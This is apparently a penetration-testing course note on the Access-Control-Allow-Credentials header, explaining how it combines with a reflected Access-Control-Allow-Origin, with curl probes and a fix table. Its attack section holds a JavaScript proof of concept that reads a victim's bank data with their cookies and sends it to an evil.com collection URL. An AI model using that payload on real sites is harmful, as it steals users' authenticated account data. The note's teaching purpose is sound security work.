---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.42 Access-Control-Allow-Credentials — Credential CORS Risk"
portswigger_labs: ["CORS — 4 labs"]
---

# 03.42 — Access-Control-Allow-Credentials

## What is it?

`Access-Control-Allow-Credentials: true` tells the browser to expose the response to JavaScript when the request was made with credentials (cookies, HTTP auth, TLS client certificates). Without this header, even if ACAO allows the origin, credentials won't be sent and the response won't be readable.

---

## The Critical Combination

```
DANGEROUS (if ACAO reflects any origin):
  Access-Control-Allow-Origin: https://evil.com  ← reflected origin
  Access-Control-Allow-Credentials: true          ← credentials included!
  
  → Victim's cookies sent → attacker reads authenticated response!

SAFE:
  Access-Control-Allow-Origin: *          ← wildcard
  Access-Control-Allow-Credentials: true  ← browser IGNORES this combination!
  
  (Browser enforces: can't have wildcard + credentials)
```

---

## How Credentials Flow

```
CLIENT REQUEST:
  fetch('https://target.com/api/me', {
    credentials: 'include'   ← "please include cookies!"
  })

WITHOUT Access-Control-Allow-Credentials: true:
  → Browser sends request WITH cookies (cookies always go)
  → Server processes correctly (using cookies)
  → Browser receives response
  → Browser BLOCKS JavaScript from reading response!
  → Result: fetch promise still resolves but response body unreadable!

WITH Access-Control-Allow-Credentials: true:
  → Same as above BUT
  → Browser ALLOWS JavaScript to read response!
  → If ACAO also allows the origin → full data exposure!
```

---

## Attack: CORS Credential Theft

```
// evil.com/steal.html
var r = new XMLHttpRequest();
r.open('GET', 'https://bank.com/api/account-info', true);
r.withCredentials = true;   ← include victim's bank cookies!
r.onload = function() {
  // send account info to attacker
  fetch('https://evil.com/collect?data=' + encodeURIComponent(r.responseText));
};
r.send();

WORKS IF:
  bank.com → Access-Control-Allow-Origin: https://evil.com
  bank.com → Access-Control-Allow-Credentials: true
```

---

## Testing

```bash
# Check for credential CORS:
curl -sI https://target.com/api \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=test" | grep -iE "allow-credentials|allow-origin"

# Check if both are true:
ORIGIN=$(curl -s -I https://target.com/api -H "Origin: https://evil.com" | grep -i "allow-origin")
CREDS=$(curl -s -I https://target.com/api -H "Origin: https://evil.com" | grep -i "allow-credentials")
echo "ACAO: $ORIGIN"
echo "ACAC: $CREDS"
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Dynamic ACAO + credentials: true | Strict allowlist for ACAO; never reflect arbitrary Origin |
| credentials: true needed for third-party | Use explicit allowlist, NOT wildcard |
| Credentials on public endpoints | Set credentials: false (omit header) |

---

## Related Notes
- [[41 - Access-Control-Allow-Origin]] — the ACAO header (pair with this)
- [[16 - Origin]] — Origin request header
- [[Module 08 - CORS]] — full CORS exploitation
